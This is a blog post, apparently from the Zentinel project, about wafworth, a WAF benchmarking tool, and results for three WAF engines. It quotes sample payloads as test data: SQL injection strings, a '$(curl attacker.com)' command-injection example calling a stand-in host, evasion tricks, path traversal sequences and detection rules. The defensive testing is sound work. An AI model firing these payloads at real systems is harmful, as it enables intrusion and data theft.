+++
title = "598 Attack Payloads, Three WAF Engines, One Verdict"
description = "We built wafworth, an open-source WAF testing framework with 598 tests across 18 OWASP-aligned categories, and used it to benchmark Zentinel's three WAF agent implementations against each other. No engine won everywhere. Here's what the confusion matrices actually say."
date = 2026-03-04
[taxonomies]
tags = ["security", "waf", "agents", "benchmarks", "modsecurity"]
+++

WAF marketing pages love to claim "99.9% detection" without disclosing the false-positive rate, the test corpus, or whether the tests include anything beyond `<script>alert(1)</script>`. We wanted real numbers for Zentinel's WAF agents — numbers attached to a reproducible test suite that anyone can run.

So we built [wafworth](https://github.com/zentinelproxy/wafworth) and ran 598 test cases against all three of Zentinel's WAF agent implementations. The results were not what we expected.

## What is wafworth?

wafworth is an open-source, WAF-agnostic testing framework that answers a simple question: *is your WAF worth it?*

You point it at any WAF — Zentinel, ModSecurity, Coraza, AWS WAF, Cloudflare, whatever sits in front of your application — and it fires 598 attack and benign payloads at it over HTTP. It records every response, builds a confusion matrix, and tells you exactly where your WAF detects, where it misses, and where it blocks legitimate traffic.

```
$ wafworth run --target http://your-waf:8080 --name my-waf
```

The core idea is that WAF evaluation shouldn't require vendor-specific tooling. wafworth doesn't parse ModSecurity audit logs or read cloud provider dashboards. It sends an HTTP request, checks the status code, and decides: did the WAF block it or not? That makes it work against anything that speaks HTTP.

What sets it apart from existing tools:

- **Confusion matrix metrics, not just pass/fail.** Detection rate, false-positive rate, precision, F1, balanced accuracy, and Youden's J — computed overall, per-category, and per-encoding. You get a full picture of both what the WAF catches and what it breaks.
- **Encoding auto-generation.** Each base payload can be automatically multiplied across 9 encodings — URL, double-URL, hex, Unicode escape, HTML entity, base64, UTF-7, and overlong UTF-8. A 598-test suite becomes 5,000+ effective tests, stress-testing the WAF's decoding pipeline.
- **Multi-WAF comparison.** Run the same suite against multiple WAFs and get a side-by-side table. This is how we compared our three engines, and it's how you can compare your WAF against alternatives.
- **CI integration.** `--fail-under 0.90` exits with code 1 if detection drops below 90%. `--fail-fp-over 0.05` does the same for false positives. Wire it into your pipeline and catch WAF regressions before they ship.
- **go-ftw compatibility.** Import existing OWASP CRS test suites from the go-ftw format, so you don't have to rewrite tests you already have.

The test suite ships with the tool: 598 cases across 18 OWASP-aligned categories, from classic SQLi and XSS to modern attack patterns like GraphQL abuse, SSRF against cloud metadata endpoints, and 43 real CVEs from 2014 through 2026. Each test is a YAML file with the full HTTP request and the expected outcome.

We built wafworth because we needed to make a data-driven decision about our own WAF agents. The rest of this post is that decision.

## Why not an existing tool?

Existing tools each solve part of the problem. [go-ftw](https://github.com/coreruleset/go-ftw) is great for CRS regression testing but assumes ModSecurity output. [GoTestWAF](https://github.com/wallarm/gotestwaf) covers broad attack categories but doesn't measure false-positive rates. [WAFBench](https://github.com/nicholasgasior/WAFBench) focuses on throughput, not detection accuracy.

None of them combine detection accuracy + false-positive rate + latency measurement + per-category confusion matrices + encoding auto-generation + multi-WAF comparison in a single package. We needed all of these to make an informed decision about our own agents, so we built it.

## The test suite

598 tests across 18 OWASP-aligned categories:

| Category | Attack tests | Benign tests | Total |
|----------|:-----------:|:------------:|:-----:|
| SQL Injection | 72 | 3 | 75 |
| Cross-Site Scripting | 60 | 2 | 62 |
| WAF Bypass | 66 | 0 | 66 |
| False Positives | 0 | 50 | 50 |
| Known CVEs | 37 | 6 | 43 |
| Path Traversal | 30 | 8 | 38 |
| Command Injection | 30 | 8 | 38 |
| Evasion Techniques | 25 | 5 | 30 |
| Protocol Attacks | 19 | 7 | 26 |
| Scanner Detection | 15 | 10 | 25 |
| API Security | 20 | 8 | 28 |
| Authentication Attacks | 20 | 0 | 20 |
| SSRF | 15 | 5 | 20 |
| SSTI | 15 | 3 | 18 |
| XXE | 15 | 4 | 19 |
| File Upload | 15 | 0 | 15 |
| Deserialization | 12 | 3 | 15 |
| ReDoS | 10 | 0 | 10 |

Every test case specifies the HTTP method, path, query string, headers, body, and expected outcome (block or allow). Tests are grouped by severity (critical, high, medium, low, info) and tagged with OWASP Top 10 references. Here's what one looks like:

```yaml
meta:
  category: "SQL Injection"
  subcategory: "Union-Based"
  owasp: "A03"
  severity: "critical"

tests:
  - id: sqli-union-001
    title: "UNION SELECT with column enumeration"
    tags: ["sqli", "union", "paranoia-1"]
    request:
      method: GET
      path: /api/users
      query_string: "id=1 UNION SELECT username,password FROM users--"
    expected:
      action: block
      status: 403
```

The false-positive category is the most important one. 50 tests with legitimate traffic — search queries like "drop shipping rates", file paths like `/assets/script.js`, REST API parameters with numbers and special characters. A WAF that blocks everything gets 100% detection and a useless false-positive rate.

## The three engines

Zentinel's [agent architecture](/agents/) allows WAF logic to run as an external process that communicates with the proxy over Unix domain sockets or gRPC. We currently have three WAF agent implementations:

**zentinel-waf** — A purpose-built Rust WAF agent with hand-tuned pattern matchers for SQLi, XSS, path traversal, command injection, and protocol violations. No ModSecurity rule language, no regex compilation at startup. Detections are compiled directly into the binary. Communicates via UDS.

**zentinel-zentinelsec** — A pure Rust ModSecurity rule engine ([zentinel-modsec v0.1.2](https://github.com/zentinelproxy/zentinel-modsec)). Parses and evaluates ModSecurity `SecRule` directives including `@detectSQLi`, `@detectXSS`, `@contains`, and `@rx` operators. No C dependencies. Communicates via gRPC.

**zentinel-modsec** — A wrapper around [libmodsecurity](https://github.com/owasp-modsecurity/ModSecurity) (the C library behind ModSecurity v3). Full compatibility with OWASP CRS v4, including the libinjection-based operators. Communicates via UDS.

### Test configuration

All three were tested with the same custom rule set — 67 `SecRule` directives in direct-deny mode (no anomaly scoring). The full rule file and proxy configs are in [`bench/`](https://github.com/zentinelproxy/wafworth/tree/main/bench).

**Shared settings across all agents:**

| Setting | Value |
|---------|-------|
| Failure mode | `closed` (block on agent error) |
| Body inspection | Enabled (`SecRequestBodyAccess On`) |
| Max request body | 1 MB (1,048,576 bytes) |
| Agent timeout | 5,000ms |
| Rule mode | Direct deny — every matching rule returns 403 immediately |
| Anomaly scoring | Disabled (no CRS, no score thresholds) |
| Backend | Simple HTTP echo server on `127.0.0.1:19090` |

**zentinel-waf** (UDS on `/tmp/zentinel-waf-test.sock`):

```kdl
config {
    paranoia-level 1
    sqli #true
    xss #true
    path-traversal #true
    command-injection #true
    protocol #true
    scanner-detection #true
    block-mode #true
    body-inspection #true
}
```

This agent doesn't use SecRules. The `paranoia-level 1` setting restricts it to high-confidence detections only.

**zentinel-zentinelsec** (gRPC on `127.0.0.1:50051`) and **zentinel-modsec** (UDS on `/tmp/zentinel-modsec-test.sock`) both loaded the same rule file:

```
SecRuleEngine On
SecRequestBodyAccess On
```

Followed by 67 `SecRule` directives covering 8 categories:

| Category | Rules | Operators | Variables inspected |
|----------|:-----:|-----------|---------------------|
| SQL Injection | 8 | `@detectSQLi`, `@contains` | `QUERY_STRING`, `REQUEST_URI`, `ARGS` |
| XSS | 9 | `@detectXSS`, `@contains` | `QUERY_STRING`, `REQUEST_URI`, `ARGS` |
| Path Traversal | 8 | `@contains` | `REQUEST_URI`, `QUERY_STRING` |
| Command Injection | 11 | `@contains` | `QUERY_STRING` only |
| SSRF | 10 | `@contains` | `QUERY_STRING` |
| SSTI | 4 | `@contains` | `QUERY_STRING` |
| Scanner Detection | 7 | `@contains` | `REQUEST_HEADERS:User-Agent` |
| CVE Patterns | 8 | `@contains` | `REQUEST_URI` |

Two things to note about this rule set:

1. **Command injection rules only inspect `QUERY_STRING`.** This is why all three engines score 3.3% on command injection — payloads in request bodies, cookies, and headers are invisible to the rules. This is a rule gap, not an engine gap.
2. **No `@rx` (regex) rules.** All pattern matching uses `@detectSQLi`, `@detectXSS`, and `@contains`. This keeps the comparison focused on engine behavior rather than regex implementation differences.

## Overall results

| Metric | zentinel-waf | zentinel-zentinelsec | zentinel-modsec |
|--------|:---:|:---:|:---:|
| Detection Rate | **43.1%** | 38.7% | 32.1% |
| False-Positive Rate | 9.0% | **2.5%** | **2.5%** |
| Precision | 94.9% | **98.4%** | 98.1% |
| F1 Score | **59.2%** | 55.5% | 48.4% |
| Balanced Accuracy | 67.0% | **68.1%** | 64.8% |
| Youden's J | 0.340 | **0.362** | 0.297 |
| p95 Latency | **2.8ms** | 3.1ms | 2.9ms |

No engine won everywhere. zentinel-waf has the highest raw detection rate but the worst false-positive rate. zentinel-zentinelsec has the best balanced accuracy — the metric that matters most when you care about both detection *and* operational impact. zentinel-modsec trails slightly despite using the same rules as zentinelsec, revealing differences in operator implementation between the Rust and C engines.

### What balanced accuracy tells you

Detection rate alone is a vanity metric. A WAF that blocks every request has 100% detection and is completely useless. Balanced accuracy — the arithmetic mean of detection rate and specificity (1 minus FP rate) — penalizes both missed attacks and false alarms equally:

```
Balanced Accuracy = (Detection Rate + Specificity) / 2

zentinel-waf:        (0.431 + 0.910) / 2 = 0.670
zentinel-zentinelsec: (0.387 + 0.975) / 2 = 0.681
zentinel-modsec:     (0.321 + 0.975) / 2 = 0.648
```

zentinel-zentinelsec wins despite a lower detection rate because its false-positive rate is nearly 4x lower. In production, false positives mean blocked customers, support tickets, and lost revenue. An engineer investigating a false positive costs more than the attack that a missed detection would have let through — assuming defense in depth.

Youden's J index (detection rate minus FP rate) tells the same story from a different angle. A J of 0.362 means zentinelsec is pulling 36.2% better than random chance, while zentinel-waf's higher detection is partially offset by its 9% FP rate.

### A true positive and a false positive

These are abstract metrics. Two concrete examples from the test run make them tangible.

**True positive — SQL injection caught by zentinel-zentinelsec:**

```yaml
# Test: sqli-basic-001
# "Classic OR 1=1 injection"
GET /api/users?id=1'%20OR%20'1'%3D'1 HTTP/1.1
```

The query string contains `id=1' OR '1'='1` — a textbook SQL injection that would bypass an authentication query like `SELECT * FROM users WHERE id = '1' OR '1'='1'`. The `@detectSQLi` operator (powered by libinjection) tokenizes the input, recognizes the SQL structure, and the rule fires:

```
SecRule QUERY_STRING "@detectSQLi" "id:942100,phase:1,deny,status:403"
```

Result: **403 Blocked.** This is a true positive — an attack correctly identified and stopped. zentinel-zentinelsec caught this; zentinel-waf did not, because its compiled pattern matchers don't include libinjection-style tokenization for this particular payload shape.

**False positive — legitimate search blocked by zentinel-waf:**

```yaml
# Test: ssti-fp-001
# "False positive - mustache-like display"
GET /api/search?q=price%20is%20%7B%7Bprice%7D%7D%20dollars HTTP/1.1
```

The query string decodes to `q=price is {{price}} dollars` — a user searching for template syntax, perhaps looking up how to use a Handlebars or Mustache template variable. The SSTI rule fires on the `{{` substring:

```
SecRule QUERY_STRING "@contains {{" "id:934100,phase:1,deny,status:403"
```

Result: **403 Blocked.** This is a false positive — legitimate traffic blocked because a blunt `@contains` rule can't distinguish template injection from a user typing double braces. A real customer gets a 403 error page instead of search results.

This is the tradeoff that balanced accuracy captures. zentinel-waf's SSTI rule catches more template injection attacks, but it also blocks users who type `{{` in search boxes, Slack-style `{{variable}}` references in CMS content, or Jinja documentation. zentinel-zentinelsec avoids this particular false positive because its `@contains` matching handles the same rule with slightly different input normalization, but it catches fewer SSTI attacks as a result.

## Per-category breakdown

This is where the comparison gets interesting:

| Category | zentinel-waf | zentinel-zentinelsec | zentinel-modsec |
|----------|:---:|:---:|:---:|
| SQL Injection | 37.5% | **66.7%** | 25.0% |
| Cross-Site Scripting | **73.3%** | 70.0% | 70.0% |
| Path Traversal | **80.0%** | 50.0% | 53.3% |
| Known CVEs | **54.1%** | 18.9% | 16.2% |
| Scanner Detection | **80.0%** | 6.7% | 33.3% |
| SSRF | **80.0%** | 60.0% | 60.0% |
| SSTI | **60.0%** | 53.3% | 46.7% |
| Evasion Techniques | 24.0% | **52.0%** | 48.0% |
| WAF Bypass | **56.1%** | 51.5% | 48.5% |
| Command Injection | 3.3% | 3.3% | 3.3% |
| API Security | 0.0% | 0.0% | 0.0% |
| XXE | 0.0% | 0.0% | 0.0% |

Three patterns emerge:

**Pattern-matching breadth favors zentinel-waf.** Known CVE patterns (`.env`, `.git`, `/actuator`, `/wp-login.php`), scanner user-agent strings (`sqlmap`, `nikto`, `nmap`), and path traversal sequences (`../`, `..%2f`, `%2e%2e/`) are hardcoded in the WAF agent binary. It doesn't need ModSecurity rules — the checks are compiled in. This gives it 80% detection on scanner detection and path traversal, compared to the ModSecurity engines which rely on `@contains` rules that are narrower.

**libinjection favors zentinelsec on SQLi.** The `@detectSQLi` operator powered by libinjection detects tokenized SQL patterns regardless of specific keywords. zentinelsec's pure Rust implementation of `@detectSQLi` catches 66.7% of our SQLi corpus — nearly double zentinel-waf's 37.5%. The Rust reimplementation appears to handle edge cases around parenthesized expressions and comment-based obfuscation better than the C version, which caught only 25.0%.

**Evasion resistance correlates with engine sophistication.** zentinelsec's 52% evasion detection vs zentinel-waf's 24% is the starkest gap. Evasion tests include case-alternation (`SeLeCt`), comment injection (`UN/**/ION`), whitespace substitution (`SELECT%09*`), and null-byte insertion. The ModSecurity-style engines normalize and decode before matching, while the purpose-built WAF agent matches against the raw payload.

## The categories no engine handles

Three categories scored 0% across all engines: API Security, XXE, and File Upload.

**API Security** tests include GraphQL introspection, JWT algorithm confusion, JSON depth bombs, prototype pollution, and mass assignment. These are application-logic attacks that a generic WAF rule can't distinguish from legitimate traffic. Protecting against them requires schema validation, rate limiting per operation, and application-aware policies — not pattern matching on query strings.

**XXE** tests embed entity declarations in XML bodies. All three agents currently inspect query strings and headers in phase 1 but apply limited analysis to structured body content. Detecting `<!ENTITY` declarations requires XML-aware body parsing that goes beyond the `@contains` and `@detectSQLi` operators.

**File Upload** tests use multipart form bodies with double extensions (`.php.jpg`), null bytes (`shell.php%00.png`), and polyglot files. Multipart parsing and content-type verification is a specialized capability that none of the engines implement at the rule level with our current rule set.

These gaps are intentional findings, not flaws in the test suite. They define the boundary of what pattern-based WAFs can protect and where application-level controls must take over.

## Command injection: the hardest category

At 3.3% detection across all three engines, command injection is the worst-performing attack category with actual attack tests. Only 1 of 30 attack payloads was caught.

This isn't surprising on closer examination. Our command injection tests include payloads in request bodies, cookies, and custom headers — not just query strings. The `@contains` rules only inspect `QUERY_STRING` for patterns like `;cat `, `|cat `, and `` `cat `` with trailing spaces. A payload like `{"cmd": "$(curl attacker.com)"}` in a JSON body bypasses the rule entirely.

The fix is straightforward: add `ARGS` and `REQUEST_BODY` variables to the command injection rules, and expand the pattern set to cover subshell operators (`$()`, `` ` ` ``), pipes, and semicolons without requiring trailing spaces. This is a rule gap, not an engine gap.

## Latency

All three engines add less than 3ms at p95 to request processing:

| Engine | p50 | p95 | p99 | Mean | Max |
|--------|:---:|:---:|:---:|:----:|:---:|
| zentinel-waf | 2.49ms | **2.77ms** | **3.04ms** | 2.48ms | 5.32ms |
| zentinel-modsec | 2.54ms | 2.87ms | 3.49ms | 2.55ms | 7.39ms |
| zentinel-zentinelsec | 2.59ms | 3.13ms | 3.60ms | 2.61ms | 6.43ms |

zentinel-waf is fastest because its pattern matchers are compiled Rust code — no rule parsing, no regex compilation, no operator dispatch. The ModSecurity engines pay for rule evaluation flexibility with roughly 0.3ms of additional latency at p95.

The practical difference is negligible. At 3ms per request, the WAF agent adds less latency than a single DNS lookup. The bottleneck in any real deployment will be the upstream backend, not the WAF.

## The OWASP CRS baseline

The detection rates in this post — 32% to 43% — look low. That's because we tested with 67 hand-written direct-deny rules, not the OWASP Core Rule Set. Understanding the difference matters for interpreting the results.

### What is CRS?

The [OWASP Core Rule Set](https://coreruleset.org/) (CRS) is the standard open-source rule set for ModSecurity-compatible WAFs. CRS v4 ships approximately 200 rules across 15+ request/response phases. It's the default ruleset for ModSecurity+Nginx, ModSecurity+Apache, Coraza, and most cloud WAFs that claim "OWASP protection."

CRS uses **anomaly scoring** rather than direct deny. Each rule that matches increments a score, and a separate blocking evaluation rule (REQUEST-949) denies the request only if the cumulative score exceeds a configurable threshold. This design reduces false positives — a single weak signal doesn't trigger a block, but multiple signals compound.

### CRS paranoia levels

CRS groups rules into four paranoia levels (PL), each enabling progressively more aggressive detection:

| Paranoia Level | What it adds | Typical use case |
|:-:|---|---|
| **PL1** | High-confidence detections — `@detectSQLi`, `@detectXSS`, common path traversal, known scanner signatures | Production default |
| **PL2** | Broader regex patterns, additional HTTP method restrictions, tighter header validation | Hardened production |
| **PL3** | Aggressive patterns that trigger on uncommon but legitimate characters (backticks, semicolons in values) | High-security applications with allowlisting |
| **PL4** | Extremely restrictive — blocks most special characters in any parameter | Research / maximum detection at the cost of heavy false positives |

Higher paranoia levels catch more attacks but produce more false positives. Most production deployments use PL1 or PL2. PL3+ requires per-application allowlisting to be usable.

### How CRS compares to our 67-rule set

Our custom rule set is roughly equivalent to a **subset of CRS PL1** — the same operator types (`@detectSQLi`, `@detectXSS`, `@contains`) applied to the same core categories. The key differences:

| Aspect | Our 67 rules | CRS v4 PL1 |
|--------|:---:|:---:|
| Total rules | 67 | ~120 |
| Anomaly scoring | No (direct deny) | Yes (threshold-based) |
| `@rx` regex rules | 0 | ~60 |
| Body inspection rules | 3 (`ARGS` for SQLi/XSS) | ~40 |
| Response inspection | None | ~20 rules |
| Transformation chains | None | `t:urlDecodeUni,t:lowercase` etc. |
| Variables inspected | `QUERY_STRING`, `REQUEST_URI`, `ARGS`, `User-Agent` | `ARGS`, `ARGS_NAMES`, `REQUEST_COOKIES`, `REQUEST_HEADERS`, `XML:/*`, `REQUEST_BODY` |

The biggest gap is **variable coverage**. CRS PL1 inspects cookies, all request headers, XML bodies, and argument names — not just query strings and URIs. Our command injection rules only inspect `QUERY_STRING`, which is why all three engines scored 3.3% on that category. CRS PL1 would inspect `ARGS` (covering body parameters) and apply transformation chains to normalize case and decode URL encoding before matching, catching significantly more.

A full CRS PL1 deployment would likely score **60-80% detection** on wafworth's corpus with a **1-3% FP rate**, based on published CRS benchmarks and the rule coverage delta. PL2 would push detection higher at the cost of more false positives.

### Why we didn't test with full CRS

We initially attempted to test zentinel-modsec with OWASP CRS v4, but hit two problems:

1. **Setup variable:** CRS rule 901001 checks for `tx.crs_setup_version` and denies with status 500 if it's missing. Our initial config didn't set it. After fixing this, CRS loaded without errors.

2. **Anomaly scoring through FFI:** The blocking evaluation rule (REQUEST-949) uses macro expansion (`@ge %{tx.inbound_anomaly_score_threshold}`) to compare the accumulated score against the threshold. This macro expansion doesn't work correctly through the Rust bindings to libmodsecurity — individual detection rules fire and increment score variables, but the final comparison in rule 949 never triggers.

This is a known limitation of using libmodsecurity through FFI. The C library's variable expansion depends on internal state management that doesn't translate cleanly through the bindings. We're investigating whether this is a binding issue or a fundamental incompatibility.

For the comparison in this post, we needed all three engines running the same rules, and direct-deny mode is the common denominator that works across all of them. The 67-rule set isolates engine behavior — how each engine implements `@detectSQLi`, `@detectXSS`, and `@contains` — independent of rule breadth. It answers "given the same rules, which engine executes them best?" rather than "which ruleset provides the most coverage?"

Running wafworth against a standalone ModSecurity+Nginx with full CRS v4 is on our roadmap and will be published as a separate comparison using the Docker examples in `wafworth/examples/modsecurity-nginx/`.

## What we're shipping

Based on these results, we're making three changes:

**1. zentinel-zentinelsec becomes the default WAF agent.** Its balanced accuracy (68.1%) and precision (98.4%) make it the safest choice for production deployments. The 2.5% false-positive rate means roughly 1 in 40 false alarms — manageable with allowlisting.

**2. zentinel-waf gets an evasion normalization layer.** The 24% evasion detection rate is unacceptable. Adding URL decoding, case normalization, and comment stripping before pattern matching should close most of the gap with the ModSecurity engines, without sacrificing the compilation-time advantage.

**3. Command injection rules are getting expanded.** All three engines need `ARGS` and `REQUEST_BODY` inspection for command injection patterns. This is the highest-leverage rule improvement available — going from 3.3% to an estimated 30-40% detection with a few additional `SecRule` directives.

## Try it yourself

Every result in this post was generated by [wafworth](https://github.com/zentinelproxy/wafworth). Install it, point it at your WAF, and see how your numbers compare:

```bash
pip install wafworth

# Run the full 598-test suite
wafworth run --target http://your-waf:8080 --name my-waf --output results/

# Stress-test with all 9 encodings (~5,000 effective tests)
wafworth run --target http://your-waf:8080 --encodings all --output results/

# Compare your WAF against ours
wafworth compare -r results/my-waf/ -r results/zentinel-zentinelsec/ -o comparison/
```

The `examples/` directory includes Docker Compose setups for ModSecurity+Nginx, Coraza+Caddy, and Zentinel, so you can spin up a comparison environment in minutes.

598 tests, 18 categories, full confusion matrices. No engine scored above 50% detection. That's not a failure of the engines — it's an honest measurement of where pattern-based WAFs stand against a modern attack corpus. Defense in depth isn't a platitude. It's an engineering requirement.

<div class="blog-cta">
    <div class="blog-cta__title">Try Zentinel</div>
    <div class="blog-cta__actions">
        <a href="/install/" class="btn btn-gradient">Install Zentinel</a>
        <a href="https://registry.zentinelproxy.io" class="btn btn-secondary" target="_blank" rel="noopener">Agent Registry</a>
        <a href="/benchmarks/" class="btn btn-secondary">Benchmarks</a>
    </div>
</div>
